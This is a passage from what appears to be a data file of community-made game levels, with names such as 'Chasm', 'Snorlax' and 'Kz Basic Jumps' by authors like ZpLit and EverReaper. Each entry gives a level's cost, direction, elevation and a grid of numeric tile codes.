15,15,15,15,15,15,15,15,15,15,6,6,5,0,0,1,75,75,14,15,15,15,1,1,15,15,15,15,15,15,15,15,15,1,1,75,75,75,14,15,15,1,0,1,1,1,1,15,15,15,15,15,15,1,1,75,75,75,14,15,1,0,1,15,15,15,15,1,15,15,15,15,15,1,1,75,75,75,1,1,0,0,1,15,15,15,15,15,15,15,15,15,1,0,1,93,75,1,0,0,0,1,15,15,15,15,15,15,15,15,1,1,0,0,0,1,1,0,0,0,0,1,88,2,2,88,1,1,1,1,0,0,0,0]});
maps.push({name="Chasm",author="ZpLit",id="#1672785651",direction="forward",cost=392,elevation=-6,map=[0,0,0,1,1,1,1,24,24,2,2,24,24,1,1,1,0,0,1,1,1,1,1,21,22,22,23,24,24,24,24,24,24,23,22,22,1,1,93,18,23,22,21,21,22,22,23,24,24,24,24,24,24,23,22,22,21,20,19,18,23,22,21,21,22,5,5,5,185,185,185,185,5,5,5,22,21,20,19,5,23,22,21,5,5,5,5,5,185,185,185,185,5,5,5,5,5,5,5,5,4,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,5,5,0,0,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,5,0,0,0,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,0,0,0,5,5,5,5,5,5,5,5,185,185,185,185,5,5,5,5,5,5,0,0,5,5,5,5,5,1,1,1,185,185,185,185,1,1,1,5,5,5,5,5,1,20,19,18,18,18,18,118,24,24,24,24,118,18,18,18,18,19,20,1,1,20,1,1,1,1,1,58,24,24,24,24,58,1,1,1,1,1,20,1,1,20,20,21,22,23,24,58,24,24,24,24,58,24,23,22,21,20,20,1,1,20,20,21,22,23,24,58,24,24,24,24,58,24,23,22,21,20,20,1,0,0,0,0,0,0,1,118,118,118,118,118,118,1,0,0,0,0,0,0,0,0,0,0,0,0,1,18,88,2,2,88,18,1,0,0,0,0,0,0]});
maps.push({name="We Made It",author="ZpLit",id="#1672785713",direction="forward",cost=428,elevation=4,map=[5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,10,2,2,10,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,90,10,10,10,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,10,10,10,90,5,1,1,1,1,1,1,199,199,199,199,199,5,5,5,5,90,10,10,10,1,114,114,114,114,114,1,9998,9998,9998,9998,9998,199,5,5,5,10,10,90,10,1,114,66,14,66,114,1,57,57,57,57,57,9998,199,5,5,10,10,10,10,1,114,66,125,66,114,1,57,57,57,57,57,9998,199,5,5,10,90,10,90,1,114,76,76,76,114,1,90,57,57,90,90,57,199,5,5,10,10,10,10,1,114,76,76,76,114,1,22,56,56,22,23,23,23,5,5,90,10,90,10,1,114,76,76,76,114,1,21,55,55,21,5,5,5,5,5,10,10,10,10,1,9998,100,76,93,9998,1,20,54,54,20,20,20,5,4,5,11,11,11,11,1,114,24,76,24,114,1,54,54,54,54,54,54,20,14,13,12,12,12,12,20,54,114,114,114,54,95,54,54,54,54,54,95,54,14,13,12,12,12,12,20,54,54,54,54,54,95,54,54,54,54,54,95,54,14,13,12,12,12,12,20,54,54,54,54,54,20,20,20,54,54,54,54,20,14,13,12,12,12,90,20,20,95,95,20,20,9998,90,54,54,54,54,20,0,0,0,0,0,0,0,9998,9998,54,54,54,54,20,55,55,55,54,54,20,0,0,0,0,0,0,0,143,54,54,54,54,54,20,55,55,55,54,54,20,0,0,0,0,0,0,0,20,54,54,54,54,54,20,90,54,54,54,54,20,0,0,0,0,0,0,0,0,20,20,2,2,20,0,9998,20,20,20,20,0,0,0,0,0,0,0,0]});
maps.push({name="Divided Attention",author="ZpLit",id="#1672857329",direction="forward",cost=288,elevation=-14,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,34,34,34,35,36,36,0,0,0,39,39,0,0,0,36,36,35,34,34,34,34,34,34,35,36,36,0,0,0,39,39,0,0,0,36,36,35,34,34,34,34,34,1,0,36,36,0,0,0,39,39,0,0,0,36,36,0,1,34,34,34,90,1,0,36,36,36,37,38,39,39,38,37,36,36,36,0,1,90,34,34,34,1,0,36,36,36,37,38,39,39,38,37,36,36,36,0,1,34,34,34,34,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,34,34,33,33,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,33,33,90,33,32,31,30,29,28,28,129,0,0,128,28,28,29,30,31,32,33,90,33,33,32,31,30,29,28,28,94,0,0,94,28,28,29,30,31,32,33,33,32,32,1,38,1,0,0,0,0,0,0,0,0,0,0,1,38,1,32,32,31,31,1,93,1,0,0,0,0,0,0,0,0,0,0,1,93,1,31,31,30,30,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,30,30,50,50,36,35,0,0,0,0,187,27,27,186,0,0,0,0,35,36,50,50,50,50,36,35,0,0,0,0,0,125,125,0,0,0,0,0,35,36,50,50,49,49,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,49,49,49,49,48,47,46,45,45,95,5,5,5,5,95,45,45,46,47,48,49,49,49,49,48,47,46,45,45,95,5,5,5,5,95,45,45,46,47,48,49,49,15,15,14,13,12,11,11,11,1,2,2,1,11,11,11,12,13,14,15,15]});
maps.push({name="Twin Towers",author="sivi",id="#1672886559",direction="forward",cost=370,elevation=0,map=[0,0,0,0,0,0,1,1,105,2,2,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,105,105,105,105,1,0,0,0,0,0,0,0,1,199,1,199,1,1,90,105,105,105,105,90,1,1,199,1,199,1,0,1,1,124,124,90,124,1,105,105,105,105,105,105,1,124,90,124,124,1,1,1,90,124,124,124,124,124,124,148,1,1,148,124,124,124,124,124,124,90,1,199,124,124,124,124,124,1,1,199,1,1,199,1,1,124,124,124,124,124,199,1,124,124,124,1,1,1,187,5,0,0,5,186,1,1,1,124,124,124,1,199,124,124,124,199,93,0,0,0,0,0,0,0,0,93,199,124,124,124,199,1,90,124,124,199,7,186,0,0,0,0,0,0,187,7,199,124,124,90,1,199,124,124,124,199,183,0,0,0,0,0,0,0,0,183,199,124,124,124,199,1,124,124,124,199,7,186,0,0,0,0,0,0,187,7,199,124,124,124,1,199,90,124,124,199,183,0,0,0,0,0,0,0,0,183,199,124,124,90,199,1,124,124,124,1,1,1,105,105,105,105,105,105,1,1,1,124,124,124,1,199,124,124,124,1,105,105,5,5,5,5,5,5,105,105,1,124,124,124,199,1,124,124,124,124,105,1,90,5,5,5,5,90,1,105,124,124,124,124,1,199,90,124,124,124,150,199,5,5,5,5,5,5,199,150,124,124,124,90,199,1,1,124,90,124,105,1,90,5,5,5,5,90,1,105,124,90,124,1,1,0,1,1,199,1,105,105,5,5,5,5,5,5,105,105,1,199,1,1,0,0,0,0,0,1,1,1,94,5,5,5,5,94,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,105,2,2,105,1,1,0,0,0,0,0,0]});
maps.push({name="Dedication To Chinny",author="ZpLit",id="#1673061264",direction="forward",cost=490,elevation=-4,map=[14,127,14,14,14,14,14,14,128,2,2,129,14,14,14,14,14,14,127,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,90,14,14,199,199,199,199,199,13,9998,9998,13,199,199,199,199,199,14,14,90,14,14,14,199,5,5,5,5,12,14,14,12,5,5,5,5,199,14,14,14,14,14,90,199,5,100,5,90,11,87,87,11,5,90,100,5,199,90,14,14,14,14,14,199,5,90,5,5,10,14,14,10,5,5,5,5,199,14,14,14,14,14,14,199,5,5,5,5,9,14,14,9,5,90,5,5,199,14,14,14,14,127,14,199,5,5,90,5,8,14,14,8,5,5,5,5,199,14,127,14,14,14,14,199,5,5,5,5,7,14,14,7,5,5,90,5,199,14,14,14,90,14,14,199,5,90,5,9998,6,14,14,6,9998,5,5,5,199,14,14,90,14,14,14,199,5,5,5,5,5,14,14,5,5,5,5,5,199,14,14,14,14,14,90,199,5,5,90,5,5,14,14,5,90,5,90,5,199,14,14,14,14,14,14,199,5,5,5,5,90,14,14,5,5,5,5,5,199,90,14,14,14,14,14,199,90,5,5,5,5,14,14,5,5,90,5,5,199,14,14,14,14,127,14,5,5,5,90,5,5,14,14,5,5,5,5,5,5,14,127,14,14,14,14,5,5,12,12,12,13,14,14,13,12,12,12,5,5,14,14,14,140,140,140,9998,6,12,12,12,13,14,14,13,12,12,12,6,9998,140,140,140,5,5,5,5,7,11,11,199,199,199,199,199,199,11,11,7,5,5,5,5,9998,9998,5,5,8,10,10,10,10,10,10,10,10,10,10,8,5,5,5,5,93,24,5,5,9,10,10,10,88,2,2,88,10,10,10,9,5,5,5,5]});
maps.push({name="Why am I so slow",author="EverReaper",id="#1673066503",direction="forward",cost=108,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,94,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,5,5,5,94,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,96,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,0,0,142,142,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,5,5,5,93,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,5,5,5,93,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Submechanophobia",author="ZpLit",id="#1673068541",direction="forward",cost=352,elevation=0,map=[0,0,0,0,0,1,1,1,1,2,2,1,1,1,1,0,0,0,0,0,0,0,0,0,1,68,68,68,76,14,14,76,68,68,68,1,0,0,0,0,0,0,0,0,1,68,68,68,76,14,14,76,68,68,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,1,1,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,0,0,1,68,1,68,1,0,0,0,0,0,0,0,0,1,68,1,68,1,1,1,1,68,1,68,1,0,0,0,0,91,91,91,91,14,68,68,68,69,68,68,69,68,68,68,14,91,91,91,91,14,1,0,0,0,14,14,14,1,68,68,1,14,14,14,0,0,0,1,14,14,1,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,1,14,14,1,0,0,1,1,1,1,76,68,68,76,1,1,1,1,0,0,1,14,14,14,14,14,14,95,95,14,14,14,14,14,14,95,95,14,14,14,14,14,14,14,14,14,14,95,95,14,88,2,2,88,14,95,95,14,14,14,14,14]});
maps.push({name="Average GFL Player",author="EverReaper",id="#1673084223",direction="left",cost=301,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,8,8,1,1,1,1,1,1,1,1,1,8,1,0,0,0,1,1,1,6,8,8,8,8,8,8,8,8,8,8,8,8,1,0,0,1,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,1,0,1,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,8,1,1,8,8,8,1,1,1,8,8,8,8,1,1,1,8,8,8,8,8,1,1,8,8,1,1,39,1,3,3,1,1,1,39,1,1,8,8,8,8,1,1,1,1,39,39,39,39,39,39,1,39,39,39,39,1,1,8,8,8,1,1,1,1,39,39,39,39,39,39,39,39,39,39,39,39,1,8,8,8,1,1,8,8,1,39,1,1,39,39,39,39,39,39,1,39,1,1,8,8,1,1,8,8,1,39,39,39,39,39,1,1,39,39,1,39,39,1,1,8,1,2,8,137,1,39,39,39,39,39,39,39,39,39,1,39,39,1,0,1,1,2,8,137,1,39,1,1,39,39,1,1,39,39,1,39,39,1,0,0,1,1,8,8,1,39,39,39,39,39,39,39,39,39,1,39,39,1,0,0,0,0,1,1,39,39,39,39,39,39,39,39,39,39,1,39,1,1,0,0,0,0,0,1,39,39,39,39,136,136,1,39,39,39,1,1,1,0,0,0,0,0,0,1,39,39,39,39,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Doggo",author="EverReaper",id="#1673086112",direction="right",cost=335,elevation=0,map=[0,0,0,0,0,0,0,0,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,57,57,57,57,57,57,57,1,1,0,0,0,0,0,0,1,1,1,57,57,57,57,57,57,57,57,57,57,57,1,0,0,0,1,1,37,37,37,57,57,57,57,57,57,37,37,37,37,57,57,1,0,1,37,37,37,37,57,57,57,57,57,57,37,37,37,37,37,37,57,57,1,1,37,97,37,57,57,57,57,57,57,57,37,37,37,37,37,37,37,57,1,0,1,37,57,57,57,57,57,57,57,57,37,37,37,37,37,37,37,57,1,0,0,1,57,57,57,57,1,1,57,57,37,37,37,37,37,37,37,37,1,0,0,1,57,57,57,57,1,1,57,57,37,37,37,37,37,37,37,37,1,0,0,1,57,57,57,57,57,57,57,57,57,37,37,37,37,37,37,37,1,0,0,1,57,57,57,57,57,57,57,57,57,57,37,37,37,37,37,37,1,0,0,1,57,57,57,57,57,57,57,57,57,57,1,37,37,37,37,37,1,0,1,37,57,57,57,57,57,57,57,57,57,57,1,37,37,37,37,96,1,1,37,37,57,57,57,1,1,57,57,57,57,57,1,37,37,37,37,96,2,1,37,99,57,57,57,1,1,57,1,57,57,57,1,37,37,37,37,96,2,0,1,37,57,57,57,57,57,57,1,1,1,57,1,37,37,37,37,1,0,0,0,1,57,57,57,57,57,57,1,1,1,1,37,37,37,37,1,0,0,0,0,0,1,1,57,57,57,57,1,1,1,37,37,37,1,1,0,0,0,0,0,0,0,0,1,1,1,57,98,93,93,98,37,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,0,0,0,0,0,0]});
maps.push({name="Kz   Ladder Strafe",author="EverReaper",id="#1673122839",direction="forward",cost=159,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,17,99,17,131,17,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,17,65,65,65,17,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,3,1,0,0,0,0,0,0,5,5,5,0,1,0,0,5,5,0,0,0,3,1,0,0,0,0,13,12,5,5,5,0,3,0,0,65,93,0,0,1,3,0,0,0,0,0,14,11,5,5,5,0,3,0,0,65,93,0,0,1,3,0,0,0,0,0,15,10,5,5,5,0,1,0,0,5,5,0,0,0,0,0,0,0,0,0,16,9,5,5,5,0,0,0,0,0,5,0,0,0,0,19,19,19,19,19,17,8,96,5,5,0,0,0,0,0,0,0,0,0,0,19,132,19,19,19,18,7,96,5,5,0,0,0,0,0,5,0,0,0,0,19,19,19,19,19,19,6,96,5,5,0,0,0,0,0,131,0,0,0,0,19,19,0,0,0,0,0,96,0,0,0,0,0,0,0,0,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,97,5,0,0,0,0,0,0]});
maps.push({name="Cant See In The Mist",author="ZpLit",id="#1673129076",direction="forward",cost=615,elevation=0,map=[199,199,199,199,199,199,199,199,199,199,199,199,14,2,2,14,199,199,199,199,199,199,199,14,14,14,199,199,199,199,199,199,14,14,14,14,199,199,199,199,199,199,14,14,14,14,14,199,199,199,199,199,199,14,14,86,199,199,199,199,199,14,14,14,86,14,14,14,199,199,199,199,199,14,14,14,14,199,199,199,199,14,14,14,199,14,86,14,14,199,199,199,199,199,14,14,14,199,199,199,199,14,86,14,199,199,14,14,14,14,199,199,199,199,14,14,14,14,199,199,199,14,14,14,199,199,14,14,14,14,199,199,199,199,199,14,14,14,199,199,199,14,14,14,199,199,199,14,14,14,199,199,199,199,199,86,14,14,199,199,199,14,14,14,199,199,199,14,86,14,199,199,199,199,199,14,14,14,14,199,199,14,14,14,199,199,199,14,14,14,199,199,199,199,199,199,14,14,14,199,199,14,14,86,199,199,199,14,14,14,14,199,199,199,199,199,14,14,14,199,199,14,14,14,199,199,199,199,14,14,14,199,199,199,199,199,14,14,14,199,199,14,14,14,14,199,199,199,14,14,14,199,199,199,199,199,14,14,14,199,199,199,14,14,14,14,199,199,14,14,14,199,199,199,199,199,14,14,14,199,199,199,199,14,14,14,199,199,14,86,14,199,199,199,199,14,86,14,14,199,199,199,199,14,14,14,199,199,14,14,14,14,14,14,14,14,14,14,14,199,199,199,199,86,14,14,199,199,14,14,14,14,86,14,14,14,14,14,199,199,199,199,199,14,14,14,199,199,199,14,14,14,14,14,14,14,14,199,93,199,199,199,199,14,14,14,14,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,199,88,2,2,88,199,199,199,199,199,199,199,199,199,199,199,199,199]});
maps.push({name="Snorlax",author="EverReaper",id="#1673132146",direction="right",cost=319,elevation=17,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,3,75,75,75,3,1,0,0,0,0,0,0,0,0,0,0,0,0,5,5,62,62,75,62,62,5,0,0,0,0,0,0,0,0,0,0,0,1,62,62,5,5,62,62,62,5,0,0,0,0,0,0,0,0,0,5,5,62,62,62,62,62,66,66,66,5,0,0,0,0,0,0,0,0,5,66,5,62,62,62,62,62,62,66,66,5,5,0,0,0,0,0,0,5,66,146,5,62,62,62,62,62,62,66,66,5,5,0,0,0,0,0,0,5,146,5,62,62,62,62,62,62,5,62,62,62,5,0,0,0,0,0,0,0,5,62,62,62,62,62,62,5,146,62,75,75,62,2,0,0,0,0,0,5,5,62,62,62,62,62,62,5,66,62,75,75,62,2,0,0,0,0,5,62,5,62,62,62,62,62,62,5,146,66,62,3,5,0,0,0,5,5,62,62,5,62,62,62,62,62,62,62,5,146,66,66,5,0,0,5,66,62,5,62,62,5,62,62,5,5,62,62,62,62,66,66,5,0,5,66,66,62,5,62,62,5,5,5,146,66,5,62,3,66,66,5,0,0,5,5,5,66,62,62,62,62,5,146,66,66,66,5,66,66,66,5,0,0,0,0,5,66,62,5,62,62,5,66,66,66,66,66,66,66,5,0,0,0,0,0,0,5,66,5,3,66,66,5,66,66,66,66,66,5,0,0,0,0,0,0,5,66,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0]});
maps.push({name="Kakarot",author="EverReaper",id="#1673133422",direction="left",cost=162,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,22,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,22,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,22,22,22,22,22,0,0,0,0,22,22,0,0,0,0,0,0,0,22,22,22,22,22,62,62,22,0,0,62,62,62,135,62,0,0,0,0,161,0,22,22,22,22,62,62,62,0,62,62,135,135,62,62,3,56,56,39,161,0,0,22,22,62,146,146,62,62,62,62,62,135,135,56,56,56,56,39,161,22,22,22,62,62,62,62,62,62,62,62,62,135,135,56,56,0,0,0,0,2,22,22,22,62,146,146,62,62,62,62,62,135,135,56,56,56,56,39,161,2,22,22,22,22,62,62,62,0,62,135,135,135,62,62,3,56,56,39,161,0,0,0,22,62,62,22,0,0,0,62,62,62,135,62,0,0,0,0,161,0,22,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Chef Kat",author="EverReaper",id="#1673134673",direction="forward",cost=318,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,0,0,0,0,0,0,0,0,0,1,1,1,1,1,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,19,19,1,0,0,5,5,0,0,0,0,1,1,1,19,1,1,19,19,19,19,19,1,0,5,146,146,5,5,5,5,76,1,19,19,1,1,19,19,19,19,19,19,1,5,146,146,146,146,76,76,76,1,19,19,19,19,19,1,19,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,19,19,1,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,1,19,1,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,1,1,19,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,1,1,19,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,1,19,1,19,19,19,1,5,146,146,146,146,76,76,1,19,19,19,19,19,19,19,1,19,19,19,1,5,146,146,146,146,76,76,76,1,19,19,19,19,19,1,19,19,19,19,1,5,146,146,5,5,5,5,76,1,19,19,1,1,19,19,19,19,19,19,1,0,5,5,0,0,0,0,1,1,1,19,1,1,19,19,19,19,19,1,0,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,1,19,19,19,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,1,1,1,1,1,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,0,0,0]});
maps.push({name="Kz   Basic Jumps",author="EverReaper",id="#1673137335",direction="left",cost=310,elevation=0,map=[5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,139,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,103,103,5,137,5,101,101,5,134,5,98,98,5,132,5,96,96,5,5,2,103,103,5,5,5,101,101,5,5,5,98,98,5,5,5,96,96,5,5,5,0,199,0,5,5,0,199,0,5,5,0,199,0,5,0,199,0,5,5,5,0,199,0,0,0,0,199,0,0,0,0,199,0,5,0,199,0,0,0,5,5,199,0,0,0,0,199,0,0,0,0,199,0,0,0,199,0,5,5,5,5,199,0,5,5,0,199,0,5,5,0,199,0,5,0,199,0,5,5,1,0,199,0,0,0,0,199,0,5,5,0,199,0,5,0,199,0,0,0,5,0,199,0,0,0,0,199,0,0,0,0,199,0,0,0,199,0,5,5,1,0,199,0,5,5,0,199,0,0,0,0,199,0,5,0,199,0,5,5,5,0,199,0,0,0,0,199,0,5,5,0,199,0,5,0,199,0,0,0,6,0,199,0,0,0,0,199,0,5,5,0,199,0,0,0,199,0,5,5,0,3,1,0,5,5,0,199,0,0,0,0,199,0,5,0,199,0,5,5,0,0,199,0,0,0,0,199,0,0,0,0,199,0,5,0,199,0,0,0,0,6,199,0,0,0,0,199,0,5,5,0,199,0,0,0,199,0,5,5,0,0,199,0,5,5,0,199,0,5,5,0,199,0,5,0,199,0,5,5,6,6,199,0,5,5,0,199,0,5,5,0,199,0,5,5,199,0,5,5,138,93,199,0,138,104,0,199,0,136,102,0,199,0,133,99,199,0,131,97]});
maps.push({name="Kz Climb to Heaven",author="EverReaper",id="#1673143938",direction="forward",cost=199,elevation=0,map=[0,0,0,32,33,0,33,0,0,0,33,0,33,33,0,35,0,2,2,0,31,32,0,32,33,0,0,0,33,0,0,0,33,33,0,35,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,0,5,5,0,0,0,0,131,0,0,0,23,131,0,0,0,0,0,0,0,0,5,5,0,31,31,0,23,23,142,65,23,93,0,0,0,0,37,0,36,0,5,5,0,0,0,0,23,23,142,65,23,93,0,0,0,0,0,0,0,0,5,5,0,0,0,0,23,3,65,19,23,131,0,0,0,38,0,40,0,0,5,5,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,23,0,0,0,0,0,0,0,0,43,0,43,41,0,5,5,0,31,31,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,23,23,23,23,23,23,23,23,0,0,0,0,0,0,5,5,0,31,31,0,97,23,23,23,23,23,23,23,0,0,0,0,0,0,5,5,0,30,30,0,23,23,23,23,23,23,23,23,0,0,5,5,5,5,5,5,0,0,0,0,131,23,23,23,23,23,23,23,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,96,96,0,0,30,29,0,29,28,0,28,27,0,27,26,5,5,0,0,0,96,96,0,0,30,29,0,29,28,0,28,27,0,27,26,5,5,0,0,199,96,96,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,132,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Fling Is Aggressive",author="ZpLit",id="#1673144983",direction="forward",cost=194,elevation=0,map=[0,0,0,0,0,0,0,1,76,2,2,76,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,68,68,1,0,0,0,0,0,0,0,0,0,0,0,0,0,95,14,14,1,68,68,1,14,14,95,0,0,0,0,0,0,0,0,0,0,87,1,68,68,68,68,68,68,1,87,0,0,0,0,0,0,0,0,0,0,14,1,68,14,34,34,14,68,1,14,0,0,0,0,0,0,0,0,0,0,14,1,69,1,0,0,1,69,1,14,0,0,0,0,0,0,0,0,0,0,14,1,76,1,0,0,1,76,1,14,0,0,0,0,0,0,0,0,0,0,14,1,68,1,0,0,1,68,1,14,0,0,0,0,0,0,0,0,0,0,14,1,68,1,1,1,1,68,1,14,0,0,0,0,0,0,0,0,0,0,14,1,68,68,68,68,68,68,1,14,0,0,0,0,0,0,0,0,0,0,14,1,1,34,34,34,34,1,1,14,0,0,0,0,0,0,0,0,0,0,86,14,14,88,2,2,88,14,14,86,0,0,0,0,0]});
